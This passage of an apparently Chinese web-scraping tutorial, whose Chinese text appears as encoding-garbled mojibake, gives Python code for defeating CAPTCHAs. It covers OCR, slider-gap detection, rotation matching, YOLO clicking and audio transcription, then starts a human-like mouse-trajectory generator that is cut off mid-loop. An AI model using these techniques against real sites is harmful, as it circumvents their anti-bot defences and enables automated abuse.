        <li><strong>å¤–åŒ…</strong> (Outsource)ï¼šæ‰“ç å¹³å°ã€äººå·¥æ‰“ç </li>
      </ol>

      <hr />

      <h2 id="1-éªŒè¯ç ç±»å‹åˆ†ç±»">1. éªŒè¯ç ç±»å‹åˆ†ç±»</h2>

      <h3 id="11-æ–‡å­—éªŒè¯ç -text-based-captcha">1.1 æ–‡å­—éªŒè¯ç  (Text-based CAPTCHA)</h3>

      <h4 id="ç‰¹å¾">ç‰¹å¾</h4>

      <ul>
        <li>æ‰­æ›²å˜å½¢çš„å­—æ¯/æ•°å­—</li>
        <li>æ·»åŠ å™ªç‚¹ã€å¹²æ‰°çº¿</li>
        <li>èƒŒæ™¯å¤æ‚åŒ–</li>
      </ul>

      <h4 id="éš¾åº¦ç­‰çº§">éš¾åº¦ç­‰çº§</h4>

      <table>
        <thead>
          <tr>
            <th>ç±»å‹</th>
            <th>ç¤ºä¾‹</th>
            <th>éš¾åº¦</th>
            <th>è¯†åˆ«ç‡</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>ç®€å•æ•°å­—</td>
            <td>1234</td>
            <td>â­</td>
            <td>95%+</td>
          </tr>
          <tr>
            <td>å­—æ¯+æ•°å­—</td>
            <td>A3bC</td>
            <td>â­â­</td>
            <td>85%+</td>
          </tr>
          <tr>
            <td>å¸¦å™ªç‚¹</td>
            <td>![å™ªç‚¹éªŒè¯ç ]</td>
            <td>â­â­â­</td>
            <td>70%+</td>
          </tr>
          <tr>
            <td>ä¸¥é‡æ‰­æ›²</td>
            <td>![æ‰­æ›²éªŒè¯ç ]</td>
            <td>â­â­â­â­</td>
            <td>50%+</td>
          </tr>
        </tbody>
      </table>

      <h4 id="è¯†åˆ«æŠ€æœ¯">è¯†åˆ«æŠ€æœ¯</h4>

      <ul>
        <li><strong>ä¼ ç»Ÿ OCR</strong>: Tesseract (æ•ˆæœä¸€èˆ¬)</li>
        <li><strong>ä¸“ç”¨å·¥å…·</strong>: ddddocr (å›½å†…éªŒè¯ç æ•ˆæœæä½³)</li>
        <li><strong>æ·±åº¦å­¦ä¹ </strong>: CNN åˆ†ç±»å™¨ï¼ˆéœ€è¦è®­ç»ƒæ•°æ®ï¼‰</li>
      </ul>

      <p><strong>ddddocr ä½¿ç”¨ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">ddddocr</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

<span class="n">ocr</span> <span class="o">=</span> <span class="n">ddddocr</span><span class="o">.</span><span class="n">DdddOcr</span><span class="p">()</span>

<span class="c1"># æ–¹æ³•1: è¯»å–å›¾ç‰‡æ–‡ä»¶</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;captcha.png&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">image</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">ocr</span><span class="o">.</span><span class="n">classification</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>  <span class="c1"># è¾“å‡º: &quot;1234&quot;</span>

<span class="c1"># æ–¹æ³•2: Base64 å­—ç¬¦ä¸²</span>
<span class="n">image_base64</span> <span class="o">=</span> <span class="s2">&quot;data:image/png;base64,iVBORw0K...&quot;</span>
<span class="n">image_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">image_base64</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">ocr</span><span class="o">.</span><span class="n">classification</span><span class="p">(</span><span class="n">image_bytes</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h3 id="12-æ»‘å—éªŒè¯ç -slider-captcha">1.2 æ»‘å—éªŒè¯ç  (Slider CAPTCHA)</h3>

      <h4 id="121-æ‹¼å›¾æ»‘å—">1.2.1 æ‹¼å›¾æ»‘å—</h4>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>ä¸€å¼ èƒŒæ™¯å›¾</li>
        <li>ä¸€ä¸ªæ»‘å—ï¼ˆæ‹¼å›¾ç¢ç‰‡ï¼‰</li>
        <li>éœ€è¦æ»‘åŠ¨åˆ°æ­£ç¡®ä½ç½®å®Œæˆæ‹¼å›¾</li>
      </ul>

      <p><strong>ä»£è¡¨äº§å“</strong>:</p>

      <ul>
        <li>æéªŒ (GeeTest)</li>
        <li>ç½‘æ˜“æ˜“ç›¾</li>
        <li>è…¾è®¯é˜²æ°´å¢™</li>
      </ul>

      <p><strong>è¯†åˆ«åŸç†</strong>: ç¼ºå£æ£€æµ‹</p>

      <p><strong>å®Œæ•´ç ´è§£æµç¨‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">ddddocr</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">io</span><span class="w"> </span><span class="kn">import</span> <span class="n">BytesIO</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">PIL</span><span class="w"> </span><span class="kn">import</span> <span class="n">Image</span>

<span class="c1"># 1. è·å–éªŒè¯ç å›¾ç‰‡</span>
<span class="n">bg_url</span> <span class="o">=</span> <span class="s2">&quot;https://example.com/captcha/bg.jpg&quot;</span>
<span class="n">slider_url</span> <span class="o">=</span> <span class="s2">&quot;https://example.com/captcha/slider.png&quot;</span>

<span class="n">bg_img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">bg_url</span><span class="p">)</span><span class="o">.</span><span class="n">content</span><span class="p">))</span>
<span class="n">slider_img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">slider_url</span><span class="p">)</span><span class="o">.</span><span class="n">content</span><span class="p">))</span>

<span class="c1"># 2. ä½¿ç”¨ ddddocr è¿›è¡Œç¼ºå£æ£€æµ‹</span>
<span class="n">det</span> <span class="o">=</span> <span class="n">ddddocr</span><span class="o">.</span><span class="n">DdddOcr</span><span class="p">(</span><span class="n">det</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  <span class="c1"># å¼€å¯ç›®æ ‡æ£€æµ‹æ¨¡å¼</span>

<span class="c1"># å°†å›¾ç‰‡è½¬ä¸ºå­—èŠ‚</span>
<span class="n">bg_bytes</span> <span class="o">=</span> <span class="n">BytesIO</span><span class="p">()</span>
<span class="n">bg_img</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">bg_bytes</span><span class="p">,</span> <span class="nb">format</span><span class="o">=</span><span class="s1">&#39;PNG&#39;</span><span class="p">)</span>
<span class="n">bg_bytes</span> <span class="o">=</span> <span class="n">bg_bytes</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>

<span class="c1"># æ£€æµ‹ç¼ºå£ä½ç½®</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">det</span><span class="o">.</span><span class="n">detection</span><span class="p">(</span><span class="n">bg_bytes</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>  <span class="c1"># è¾“å‡º: {&#39;target&#39;: [x, y, width, height]}</span>

<span class="c1"># 3. è®¡ç®—éœ€è¦æ»‘åŠ¨çš„è·ç¦»</span>
<span class="n">gap_x</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;target&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>  <span class="c1"># ç¼ºå£çš„ x åæ ‡</span>

<span class="c1"># 4. ç”Ÿæˆæ»‘åŠ¨è½¨è¿¹ï¼ˆè§ä¸‹æ–‡ï¼‰</span>
<span class="n">trajectory</span> <span class="o">=</span> <span class="n">generate_trajectory</span><span class="p">(</span><span class="n">gap_x</span><span class="p">)</span>

<span class="c1"># 5. æäº¤éªŒè¯</span>
<span class="c1"># (å…·ä½“å®ç°è§ä¸‹æ–‡è½¨è¿¹æ¨¡æ‹Ÿç« èŠ‚)</span>
</code></pre>
      </div>

      <p><strong>OpenCV ç¼ºå£æ£€æµ‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">cv2</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>

<span class="k">def</span><span class="w"> </span><span class="nf">find_gap</span><span class="p">(</span><span class="n">bg_img</span><span class="p">,</span> <span class="n">slider_img</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨ OpenCV æ¨¡æ¿åŒ¹é…æ‰¾ç¼ºå£&quot;&quot;&quot;</span>

    <span class="c1"># è½¬ç°åº¦å›¾</span>
    <span class="n">bg_gray</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">cvtColor</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">bg_img</span><span class="p">),</span> <span class="n">cv2</span><span class="o">.</span><span class="n">COLOR_BGR2GRAY</span><span class="p">)</span>
    <span class="n">slider_gray</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">cvtColor</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">slider_img</span><span class="p">),</span> <span class="n">cv2</span><span class="o">.</span><span class="n">COLOR_BGR2GRAY</span><span class="p">)</span>

    <span class="c1"># è¾¹ç¼˜æ£€æµ‹</span>
    <span class="n">bg_edges</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">Canny</span><span class="p">(</span><span class="n">bg_gray</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>
    <span class="n">slider_edges</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">Canny</span><span class="p">(</span><span class="n">slider_gray</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>

    <span class="c1"># æ¨¡æ¿åŒ¹é…</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">matchTemplate</span><span class="p">(</span><span class="n">bg_edges</span><span class="p">,</span> <span class="n">slider_edges</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">TM_CCOEFF_NORMED</span><span class="p">)</span>
    <span class="n">min_val</span><span class="p">,</span> <span class="n">max_val</span><span class="p">,</span> <span class="n">min_loc</span><span class="p">,</span> <span class="n">max_loc</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">minMaxLoc</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

    <span class="c1"># è¿”å›æœ€ä½³åŒ¹é…ä½ç½®</span>
    <span class="k">return</span> <span class="n">max_loc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>  <span class="c1"># x åæ ‡</span>

<span class="n">gap_x</span> <span class="o">=</span> <span class="n">find_gap</span><span class="p">(</span><span class="n">bg_img</span><span class="p">,</span> <span class="n">slider_img</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ç¼ºå£ä½ç½®: </span><span class="si">{</span><span class="n">gap_x</span><span class="si">}</span><span class="s2">px&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h4 id="122-æ—‹è½¬æ»‘å—">1.2.2 æ—‹è½¬æ»‘å—</h4>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>åœ†å½¢å›¾ç‰‡è¢«æ—‹è½¬æ‰“ä¹±</li>
        <li>æ»‘åŠ¨æ»‘å—æ—‹è½¬å›¾ç‰‡ï¼Œä½¿å…¶å½’ä½</li>
      </ul>

      <p><strong>è¯†åˆ«æ–¹æ³•</strong>:</p>

      <ol>
        <li><strong>ç‰¹å¾æå–</strong>: SIFT/ORB ç‰¹å¾ç‚¹åŒ¹é…</li>
        <li><strong>è§’åº¦è®¡ç®—</strong>: è®¡ç®—æ—‹è½¬è§’åº¦</li>
        <li><strong>æ»‘åŠ¨æ˜ å°„</strong>: å°†è§’åº¦æ˜ å°„ä¸ºæ»‘åŠ¨è·ç¦»</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">cv2</span>

<span class="k">def</span><span class="w"> </span><span class="nf">find_rotation_angle</span><span class="p">(</span><span class="n">original_img</span><span class="p">,</span> <span class="n">rotated_img</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;è®¡ç®—æ—‹è½¬è§’åº¦&quot;&quot;&quot;</span>

    <span class="c1"># ä½¿ç”¨ ORB ç‰¹å¾æ£€æµ‹</span>
    <span class="n">orb</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">ORB_create</span><span class="p">()</span>

    <span class="n">kp1</span><span class="p">,</span> <span class="n">des1</span> <span class="o">=</span> <span class="n">orb</span><span class="o">.</span><span class="n">detectAndCompute</span><span class="p">(</span><span class="n">original_img</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
    <span class="n">kp2</span><span class="p">,</span> <span class="n">des2</span> <span class="o">=</span> <span class="n">orb</span><span class="o">.</span><span class="n">detectAndCompute</span><span class="p">(</span><span class="n">rotated_img</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>

    <span class="c1"># ç‰¹å¾åŒ¹é…</span>
    <span class="n">bf</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">BFMatcher</span><span class="p">(</span><span class="n">cv2</span><span class="o">.</span><span class="n">NORM_HAMMING</span><span class="p">,</span> <span class="n">crossCheck</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">matches</span> <span class="o">=</span> <span class="n">bf</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">des1</span><span class="p">,</span> <span class="n">des2</span><span class="p">)</span>
    <span class="n">matches</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">matches</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">.</span><span class="n">distance</span><span class="p">)</span>

    <span class="c1"># è®¡ç®—æ—‹è½¬è§’åº¦ï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
    <span class="c1"># å®é™…å®ç°éœ€è¦æ›´å¤æ‚çš„å‡ ä½•å˜æ¢</span>
    <span class="n">angle</span> <span class="o">=</span> <span class="n">calculate_angle_from_matches</span><span class="p">(</span><span class="n">kp1</span><span class="p">,</span> <span class="n">kp2</span><span class="p">,</span> <span class="n">matches</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">angle</span>
</code></pre>
      </div>

      <hr />

      <h3 id="13-ç‚¹é€‰éªŒè¯ç -click-based-captcha">1.3 ç‚¹é€‰éªŒè¯ç  (Click-based CAPTCHA)</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>ç»™å‡ºä¸€å¼ å›¾ç‰‡å’Œæ–‡å­—æç¤º</li>
        <li>è¦æ±‚æŒ‰é¡ºåºç‚¹å‡»å›¾ä¸­çš„ç‰¹å®šå¯¹è±¡</li>
        <li>ç¤ºä¾‹ï¼š"è¯·ä¾æ¬¡ç‚¹å‡»å›¾ä¸­çš„çº¢ç»¿ç¯&#8221;</li>
      </ul>

      <p><strong>ä»£è¡¨äº§å“</strong>:</p>

      <ul>
        <li>è…¾è®¯é˜²æ°´å¢™</li>
        <li>12306 éªŒè¯ç ï¼ˆæ—©æœŸï¼‰</li>
      </ul>

      <p><strong>è¯†åˆ«æŠ€æœ¯</strong>:</p>

      <ul>
        <li><strong>YOLO</strong>: ç›®æ ‡æ£€æµ‹ç¥ç»ç½‘ç»œ</li>
        <li><strong>åˆ†ç±»å™¨</strong>: è®­ç»ƒé’ˆå¯¹ç‰¹å®šç±»åˆ«çš„è¯†åˆ«å™¨</li>
      </ul>

      <p><strong>YOLO è¯†åˆ«ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">ultralytics</span><span class="w"> </span><span class="kn">import</span> <span class="n">YOLO</span>

<span class="c1"># åŠ è½½é¢„è®­ç»ƒæ¨¡å‹</span>
<span class="n">model</span> <span class="o">=</span> <span class="n">YOLO</span><span class="p">(</span><span class="s1">&#39;yolov8n.pt&#39;</span><span class="p">)</span>

<span class="c1"># è¯†åˆ«å›¾ä¸­çš„å¯¹è±¡</span>
<span class="n">results</span> <span class="o">=</span> <span class="n">model</span><span class="p">(</span><span class="s1">&#39;captcha.jpg&#39;</span><span class="p">)</span>

<span class="c1"># æå–çº¢ç»¿ç¯çš„ä½ç½®</span>
<span class="n">traffic_lights</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
    <span class="n">boxes</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">boxes</span>
    <span class="k">for</span> <span class="n">box</span> <span class="ow">in</span> <span class="n">boxes</span><span class="p">:</span>
        <span class="n">class_id</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">box</span><span class="o">.</span><span class="n">cls</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="k">if</span> <span class="n">class_id</span> <span class="o">==</span> <span class="mi">9</span><span class="p">:</span>  <span class="c1"># COCO æ•°æ®é›†ä¸­çº¢ç»¿ç¯çš„ç±»åˆ« ID</span>
            <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="o">=</span> <span class="n">box</span><span class="o">.</span><span class="n">xywh</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">tolist</span><span class="p">()</span>
            <span class="n">traffic_lights</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">y</span><span class="p">)))</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;æ£€æµ‹åˆ°çš„çº¢ç»¿ç¯ä½ç½®: </span><span class="si">{</span><span class="n">traffic_lights</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="c1"># è¾“å‡º: [(120, 80), (300, 150), ...]</span>

<span class="c1"># æŒ‰è¦æ±‚é¡ºåºç‚¹å‡»</span>
<span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="n">traffic_lights</span><span class="p">:</span>
    <span class="n">click</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h3 id="14-è¡Œä¸ºéªŒè¯ç -behavioral-captcha">1.4 è¡Œä¸ºéªŒè¯ç  (Behavioral CAPTCHA)</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>ä¸æ˜¯å•çº¯çš„å›¾åƒè¯†åˆ«</li>
        <li>åˆ†æé¼ æ ‡è½¨è¿¹ã€ç‚¹å‡»é€Ÿåº¦ã€è®¾å¤‡æŒ‡çº¹ç­‰è¡Œä¸ºç‰¹å¾</li>
        <li>é€šå¸¸æ˜¯"æ— æ„ŸéªŒè¯&#8221;</li>
      </ul>

      <p><strong>ä»£è¡¨äº§å“</strong>:</p>

      <ul>
        <li>Google reCAPTCHA v3</li>
        <li>é˜¿é‡Œäº‘æ»‘åŠ¨éªŒè¯</li>
      </ul>

      <p><strong>å…³é”®æŒ‡æ ‡</strong>:</p>

      <ul>
        <li><strong>é¼ æ ‡è½¨è¿¹</strong>: æ›²çº¿è‡ªç„¶åº¦ã€åŠ é€Ÿåº¦å˜åŒ–</li>
        <li><strong>è®¾å¤‡æŒ‡çº¹</strong>: Canvasã€WebGLã€AudioContext</li>
        <li><strong>ç¯å¢ƒç‰¹å¾</strong>: User-Agentã€æ—¶åŒºã€è¯­è¨€ã€å±å¹•åˆ†è¾¨ç‡</li>
        <li><strong>è¡Œä¸ºæ—¶åº</strong>: åœç•™æ—¶é—´ã€æ“ä½œé€Ÿåº¦</li>
      </ul>

      <p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>

      <ol>
        <li><strong>æ¨¡æ‹ŸçœŸå®è¡Œä¸º</strong> (è§è½¨è¿¹æ¨¡æ‹Ÿç« èŠ‚)</li>
        <li><strong>ç»•è¿‡æŒ‡çº¹æ£€æµ‹</strong> (è§ <a href="#04-Advanced-Recipes-browser-fingerprinting">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</a>)</li>
        <li><strong>ä½¿ç”¨çœŸå®æµè§ˆå™¨</strong> (Puppeteer + Stealth æ’ä»¶)</li>
      </ol>

      <hr />

      <h3 id="15-è¯­éŸ³éªŒè¯ç -audio-captcha">1.5 è¯­éŸ³éªŒè¯ç  (Audio CAPTCHA)</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>æ’­æ”¾å«æœ‰æ•°å­—/å­—æ¯çš„è¯­éŸ³</li>
        <li>é€šå¸¸æ˜¯ä¸ºè§†éšœäººå£«æä¾›çš„æ›¿ä»£æ–¹æ¡ˆ</li>
      </ul>

      <p><strong>è¯†åˆ«æŠ€æœ¯</strong>:</p>

      <ul>
        <li><strong>è¯­éŸ³è¯†åˆ«</strong>: Google Speech API, Baidu ASR</li>
        <li><strong>æ·±åº¦å­¦ä¹ </strong>: DeepSpeech, Wav2Vec</li>
      </ul>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">speech_recognition</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">sr</span>

<span class="c1"># ä¸‹è½½éŸ³é¢‘æ–‡ä»¶</span>
<span class="n">audio_url</span> <span class="o">=</span> <span class="s2">&quot;https://example.com/captcha/audio.wav&quot;</span>
<span class="c1"># ...ä¸‹è½½åˆ°æœ¬åœ°</span>

<span class="c1"># ä½¿ç”¨ Google Speech API è¯†åˆ«</span>
<span class="n">recognizer</span> <span class="o">=</span> <span class="n">sr</span><span class="o">.</span><span class="n">Recognizer</span><span class="p">()</span>
<span class="k">with</span> <span class="n">sr</span><span class="o">.</span><span class="n">AudioFile</span><span class="p">(</span><span class="s2">&quot;captcha.wav&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">source</span><span class="p">:</span>
    <span class="n">audio</span> <span class="o">=</span> <span class="n">recognizer</span><span class="o">.</span><span class="n">record</span><span class="p">(</span><span class="n">source</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">recognizer</span><span class="o">.</span><span class="n">recognize_google</span><span class="p">(</span><span class="n">audio</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;è¯†åˆ«ç»“æœ: </span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="k">except</span> <span class="n">sr</span><span class="o">.</span><span class="n">UnknownValueError</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;æ— æ³•è¯†åˆ«&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="2-è½¨è¿¹æ¨¡æ‹Ÿ-trajectory-simulation">2. è½¨è¿¹æ¨¡æ‹Ÿ (Trajectory Simulation)</h2>

      <p>è¯†åˆ«å‡º"ç¼ºå£ä½ç½®"åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œå…³é”®æ˜¯<strong>å¦‚ä½•æ»‘è¿‡å»</strong>ã€‚åŒ€é€Ÿç›´çº¿è¿åŠ¨ä¸€å®šä¼šè¢«åˆ¤å®šä¸ºæœºå™¨äººã€‚</p>

      <h3 id="21-è´å¡å°”æ›²çº¿è½¨è¿¹">2.1 è´å¡å°”æ›²çº¿è½¨è¿¹</h3>

      <p><strong>åŸç†</strong>: ä½¿ç”¨ä¸‰æ¬¡è´å¡å°”æ›²çº¿æ¨¡æ‹Ÿäººæ‰‹çš„åŠ é€Ÿ-åŒ€é€Ÿ-å‡é€Ÿè¿‡ç¨‹</p>

      <p><strong>Python å®ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="k">def</span><span class="w"> </span><span class="nf">ease_out_quad</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ç¼“å‡ºå‡½æ•°&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="mi">1</span> <span class="o">-</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span>

<span class="k">def</span><span class="w"> </span><span class="nf">ease_in_quad</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ç¼“å…¥å‡½æ•°&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">x</span> <span class="o">**</span> <span class="mi">2</span>

<span class="k">def</span><span class="w"> </span><span class="nf">ease_out_back</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;å›å¼¹å‡½æ•°&quot;&quot;&quot;</span>
    <span class="n">c1</span> <span class="o">=</span> <span class="mf">1.70158</span>
    <span class="n">c3</span> <span class="o">=</span> <span class="n">c1</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">c3</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="n">x</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">c1</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="n">x</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_trajectory</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="n">overshoot</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    ç”Ÿæˆæ»‘åŠ¨è½¨è¿¹</span>

<span class="sd">    :param distance: æ€»è·ç¦»</span>
<span class="sd">    :param overshoot: æ˜¯å¦è¿‡å†²ï¼ˆæ»‘è¿‡å¤´å†å›æ¥ï¼‰</span>
<span class="sd">    :return: [(x, y, t), ...] è½¨è¿¹ç‚¹åˆ—è¡¨</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="n">trajectory</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="c1"># å‚æ•°è®¾ç½®</span>
    <span class="k">if</span> <span class="n">overshoot</span><span class="p">:</span>
        <span class="c1"># è¿‡å†²ï¼šæ»‘åˆ°distance + 5~10pxï¼Œå†å›æ¥</span>
        <span class="n">overshoot_distance</span> <span class="o">=</span> <span class="n">distance</span> <span class="o">+</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">overshoot_distance</span> <span class="o">=</span> <span class="n">distance</span>

    <span class="c1"># ç¬¬ä¸€é˜¶æ®µï¼šåŠ é€Ÿé˜¶æ®µ (30%)</span>
    <span class="n">current</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">t</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="n">overshoot_distance</span> <span class="o">*</span> <span class="mf">0.3</span><span class="p">:</span>
        <span class="n">t</span> <span class="o">+=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span>  <span class="c1"># æ—¶é—´é—´éš” 10-20ms</span>
        <span class="n">ratio</span> <span class="o">=</span> <span class="n">current</span> <span class="o">/</span> <span class="p">(</span><span class="n">overshoot_distance</span> <span class="o">*</span> <span class="mf">0.3</span><span class="p">)</span>
        <span class="n">move</span> <span class="o">=</span> <span class="n">ease_in_quad</span><span class="p">(</span><span class="n">ratio</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
        <span class="n">current</span> <span class="o">+=</span> <span class="n">move</span>

